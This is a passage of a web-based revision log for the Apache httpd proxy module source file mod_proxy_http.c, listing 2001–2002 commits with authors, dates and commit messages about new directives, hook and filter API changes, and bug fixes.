*Wed Feb 20 20:25:15 2002 UTC*
(22 years, 11 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93519)

File length: 43477 byte(s)

Diff to [previous 93259](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93259&r2=93519)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93259&r2=93519&diff_format=h))
```
send a 'bad-gateway'
when a invaild response flys in

```

---

Revision [**93259**](/viewvc?view=revision&revision=93259) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93259&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93259&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93259))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93259)

Modified
*Tue Feb 5 22:18:49 2002 UTC*
(22 years, 11 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93259)

File length: 43028 byte(s)

Diff to [previous 93171](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93171&r2=93259)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93171&r2=93259&diff_format=h))
```
Remove the install_transport_filters hook.  The same function can be
acheived with the pre_connection hook.  I have added the socket to the
pre_connection phase to make this possible.
Reviewed by:	Bill Stoddard

```

---

Revision [**93171**](/viewvc?view=revision&revision=93171) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93171&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93171&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93171))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93171)

Modified
*Fri Feb 1 22:16:31 2002 UTC*
(22 years, 11 months ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93171)

File length: 43039 byte(s)

Diff to [previous 93117](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93117&r2=93171)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93117&r2=93171&diff_format=h))
```
Reintroduce the create_connection hook. This hook is required to enable
modules to completely take over all network i/o from the core.

```

---

Revision [**93117**](/viewvc?view=revision&revision=93117) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93117&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93117&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93117))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93117)

Modified
*Wed Jan 30 18:46:56 2002 UTC*
(23 years ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93117)

File length: 43018 byte(s)

Diff to [previous 93103](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93103&r2=93117)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93103&r2=93117&diff_format=h))
```
add a ProxyTimeout directive

```

---

Revision [**93103**](/viewvc?view=revision&revision=93103) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93103&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93103&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93103))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93103)

Modified
*Wed Jan 30 12:40:39 2002 UTC*
(23 years ago)
by *martin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93103)

File length: 42790 byte(s)

Diff to [previous 93093](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93093&r2=93103)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93093&r2=93103&diff_format=h))
```
In the debug log, say 'decline' instead of 'reject' when DECLINEing

```

---

Revision [**93093**](/viewvc?view=revision&revision=93093) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93093&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93093&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93093))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93093)

Modified
*Wed Jan 30 04:34:11 2002 UTC*
(23 years ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93093)

File length: 42790 byte(s)

Diff to [previous 93089](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93089&r2=93093)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93089&r2=93093&diff_format=h))
```
Cleanup some fallout from the recent install_transport_filters commit.
Deprecate ap_proxy_pre_http_connection.

```

---

Revision [**93089**](/viewvc?view=revision&revision=93089) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93089&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93089&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93089))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93089)

Modified
*Tue Jan 29 21:08:37 2002 UTC*
(23 years ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93089)

File length: 42772 byte(s)

Diff to [previous 93050](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93050&r2=93089)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93050&r2=93089&diff_format=h))
```
new directive 'ProxyPreserveHost'  which allows the incoming host line to
be sent to the proxied server.

Submitted by:	g.russell@ieee.org (1.3 version)
Reviewed by:	Ian Holsman/Graham Legget/Chuck Murcko

```

---

Revision [**93050**](/viewvc?view=revision&revision=93050) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93050&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93050&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93050))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93050)

Modified
*Sun Jan 27 12:52:08 2002 UTC*
(23 years ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93050)

File length: 42083 byte(s)

Diff to [previous 93014](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93014&r2=93050)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93014&r2=93050&diff_format=h))
```
Remove the create_connection hook and put the client_socket back into the
conn_rec. The create_connection_hook has a design flaw that prevents it
from making decisions based on vhost information.

```

---

Revision [**93014**](/viewvc?view=revision&revision=93014) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93014&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93014&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93014))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93014)

Modified
*Fri Jan 25 01:11:47 2002 UTC*
(23 years ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93014)

File length: 42089 byte(s)

Diff to [previous 92928](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92928&r2=93014)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92928&r2=93014&diff_format=h))
```
Change ap_get_brigade prototype to remove *readbytes in favor of readbytes.
If you need the length, you should be using apr_brigade_length.  This is
much more consistent.  Of all the places that call ap_get_brigade, only
one (ap_http_filter) needs the length.  This makes it now possible to
pass constants down without assigning them to a temporary variable first.

Also:
- Change proxy_ftp to use EXHAUSTIVE mode (didn't catch its -1 before)
- Fix buglet in mod_ssl that would cause it to return too much data in
  some circumstances

```

---

Revision [**92928**](/viewvc?view=revision&revision=92928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92928)

Modified
*Sat Jan 19 07:45:18 2002 UTC*
(23 years ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92928)

File length: 42068 byte(s)

Diff to [previous 92727](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92727&r2=92928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92727&r2=92928&diff_format=h))
```
Input filtering prototype change: Socket blocking type should be
separate from the input filter mode type.

We also no longer look at readbytes to determine the method of
filter operation.  This makes the use of filters more obvious and
allows a wider range of options for input filters modes.

To start with, the new input filter modes are:

AP_MODE_READBYTES (no more than *readbytes returned)
AP_MODE_GETLINE (old *readbytes == 0 case)
AP_MODE_EATCRLF (old AP_MODE_PEEK)
AP_MODE_SPECULATIVE (will be used in a future ap_getline rewrite)
AP_MODE_EXHAUSTIVE (old *readbytes == -1 case)
AP_MODE_INIT (special case for NNTP over SSL)

The block parameter is an apr_read_type_e: APR_BLOCK_READ, APR_NONBLOCK_READ

This also allows cleanup of mod_ssl's handling in the getline case.

Reviewed by:	Ryan Bloom (concept), Greg Stein (concept)

```

---

Revision [**92727**](/viewvc?view=revision&revision=92727) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92727&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92727&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92727))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92727)

Modified
*Fri Jan 4 01:47:55 2002 UTC*
(23 years ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92727)

File length: 42013 byte(s)

Diff to [previous 92725](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92725&r2=92727)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92725&r2=92727&diff_format=h))
```
Fix a couple of mod_proxy problems forwarding HTTP connections:

(1) PR #9190  It failed to connect to IPv6 hosts.
(2) It failed to connect when the first IP address returned by
    the resolver was unreachable but a secondary IP address was.

PR:    9190 (partly)

```

---

Revision [**92725**](/viewvc?view=revision&revision=92725) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92725&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92725&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92725))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92725)

Modified
*Thu Jan 3 20:47:30 2002 UTC*
(23 years ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92725)

File length: 41482 byte(s)

Diff to [previous 92723](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92723&r2=92725)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92723&r2=92725&diff_format=h))
```
Keep my comments to myself.

```

---

Revision [**92723**](/viewvc?view=revision&revision=92723) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92723&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92723&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92723))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92723)

Modified
*Thu Jan 3 20:38:04 2002 UTC*
(23 years ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92723)

File length: 41524 byte(s)

Diff to [previous 92693](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92693&r2=92723)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92693&r2=92723&diff_format=h))
```
Use ap_getline() in favor of ap_proxy_string_read() in ap_proxy_http_process_response().

```

---

Revision [**92693**](/viewvc?view=revision&revision=92693) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92693&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92693&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92693))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92693)

Modified
*Mon Dec 31 21:03:12 2001 UTC*
(23 years, 1 month ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92693)

File length: 41586 byte(s)

Diff to [previous 92692](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92692&r2=92693)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92692&r2=92693&diff_format=h))
```
Fix mod_proxy seg fault when the proxied server returns
an HTTP/0.9 response or a bogus status line.

Submitted by: Adam Sussman
Reviewed by:	Bill Stoddard

```

---

Revision [**92692**](/viewvc?view=revision&revision=92692) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92692&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92692&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92692))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92692)

Modified
*Mon Dec 31 20:53:28 2001 UTC*
(23 years, 1 month ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92692)

File length: 41586 byte(s)

Diff to [previous 92691](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92691&r2=92692)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92691&r2=92692&diff_format=h))
```
Prevent mod_proxy from truncating one character off the
end of the status line returned from the proxied server.
Note that buffer is NULL terminated by the call to
ap_proxy_string_read() so there is no need to terminate it
again.

Submitted by:	Adam Sussman
Reviewed by:	Bill Stoddard

```

---

Revision [**92691**](/viewvc?view=revision&revision=92691) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92691&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92691&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92691))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92691)

Modified
*Mon Dec 31 20:46:22 2001 UTC*
(23 years, 1 month ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92691)

File length: 41578 byte(s)

Diff to [previous 92534](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92534&r2=92691)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92534&r2=92691&diff_format=h))
```
Change the call to be blocking to eliminate a loop caused when the upstream
host does not send any bytes back our way.

```

---

Revision [**92534**](/viewvc?view=revision&revision=92534) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92534&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92534&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92534))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92534)

Modified
*Wed Dec 19 16:32:01 2001 UTC*
(23 years, 1 month ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92534)

File length: 41581 byte(s)

Diff to [previous 92520](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92520&r2=92534)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92520&r2=92534&diff_format=h))
```
Remove an extra semi-colon.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**92520**](/viewvc?view=revision&revision=92520) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92520&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92520&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92520))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92520)

Modified
*Tue Dec 18 20:29:27 2001 UTC*
(23 years, 1 month ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92520)

File length: 41582 byte(s)

Diff to [previous 92030](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92030&r2=92520)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92030&r2=92520&diff_format=h))
```
get proxy in sync with the update to ap_run_create_connection

```

---

Revision [**92030**](/viewvc?view=revision&revision=92030) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92030&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92030&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92030))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92030)

Modified
*Sun Nov 18 16:59:38 2001 UTC*
(23 years, 2 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92030)

File length: 41562 byte(s)

Diff to [previous 92022](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92022&r2=92030)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=92022&r2=92030&diff_format=h))
```
Add extra If-XXX request headers to be ignored in subrequests
Allow cache-control header to get passed to subrequests
tabs -> spaces

Submitted by:	Ian Holsman

```

---

Revision [**92022**](/viewvc?view=revision&revision=92022) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92022&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=92022&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=92022))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=92022)

Modified
*Sat Nov 17 22:04:48 2001 UTC*
(23 years, 2 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=92022)

File length: 41063 byte(s)

Diff to [previous 91953](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91953&r2=92022)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91953&r2=92022&diff_format=h))
```
Only do keepalives (and keep state on the connection record) if this request
is the top-level page.

Do not pass If-XXX-Since headers to the r-proxied server on a subrequest,
and we can't handle a 30X response

```

---

Revision [**91953**](/viewvc?view=revision&revision=91953) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91953&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91953&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91953))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91953)

Modified
*Wed Nov 14 21:55:58 2001 UTC*
(23 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91953)

File length: 40290 byte(s)

Diff to [previous 91952](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91952&r2=91953)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91952&r2=91953&diff_format=h))
```
Quiet a compiler warning.

```

---

Revision [**91952**](/viewvc?view=revision&revision=91952) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91952&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91952&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91952))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91952)

Modified
*Wed Nov 14 21:18:47 2001 UTC*
(23 years, 2 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91952)

File length: 40283 byte(s)

Diff to [previous 91866](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91866&r2=91952)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91866&r2=91952&diff_format=h))
```
Get the proxy module compiling again.  This is a hack to get past the
current compiler errors.  Basically, the core now puts the socket
in the conn_rec->conn_config vector.  The proxy grabs that socket and
uses it where it used to use the client_socket field from the conn_rec.
Long-term, all of the direct socket communication needs to be removed,
and this should go through a filter stack.  Short-term, this gets the
proxy working again.

I have tested http and connect, but I haven't looked at the FTP proxy,
although it does compile now.

```

---

Revision [**91866**](/viewvc?view=revision&revision=91866) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91866&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91866&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91866))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91866)

Modified
*Mon Nov 12 03:23:12 2001 UTC*
(23 years, 2 months ago)
by *jwoolley*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91866)

File length: 40180 byte(s)

Diff to [previous 91860](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91860&r2=91866)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91860&r2=91866&diff_format=h))
```
Remove the returned-length "w" parameter from apr_bucket_heap_create()
and apr_bucket_heap_make().  It was useless, since the length is invariant
from the length passed in and from the resulting bucket's b->length.  This
takes care of a long-standing issue first brought up in February and
discussed on the dev@apr list.  (Issue #2 from the "Bucket API Cleanup
Issues" thread.)

See <http://marc.theaimsgroup.com/?l=apr-dev&m=98324983126666&w=2>

Reviewed by:    Ryan Bloom (concept)

```

---

Revision [**91860**](/viewvc?view=revision&revision=91860) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91860&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91860&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91860))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91860)

Modified
*Sun Nov 11 22:31:04 2001 UTC*
(23 years, 2 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91860)

File length: 40186 byte(s)

Diff to [previous 91757](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91757&r2=91860)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91757&r2=91860&diff_format=h))
```
This patch changes the apr_table_elts macro so that it provides
access to the internals of an apr_table_t via a const pointer
instead of the current non-const pointer.

Submitted by:	Brian Pane <BPane@pacbell.net>
Reviewed by:	Ian Holsman

```

---

Revision [**91757**](/viewvc?view=revision&revision=91757) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91757&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91757&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91757))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91757)

Modified
*Mon Nov 5 23:06:55 2001 UTC*
(23 years, 2 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91757)

File length: 40168 byte(s)

Diff to [previous 91682](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91682&r2=91757)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91682&r2=91757&diff_format=h))
```
Fix so that errordocument works when a error gets returned from the
proxy.
Problem was ErrorHandler thought it was in some kind of recursion and
couldn't find the custom error document
Obtained from: Jin Hong <jinh@cnet.com>
Submitted by:
Reviewed by:   Ian Holsman

```

---

Revision [**91682**](/viewvc?view=revision&revision=91682) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91682&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=91682&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=91682))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=91682)

Modified
*Mon Oct 29 15:44:03 2001 UTC*
(23 years, 3 months ago)
by *aaron*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=91682)

File length: 39891 byte(s)

Diff to [previous 91463](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91463&r2=91682)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=91463&r2=91682&diff_format=h))
```
Fix a truncation bug in how we print the port on the Via: header.
The routine that prints the Via: header now takes a length for
the port string.

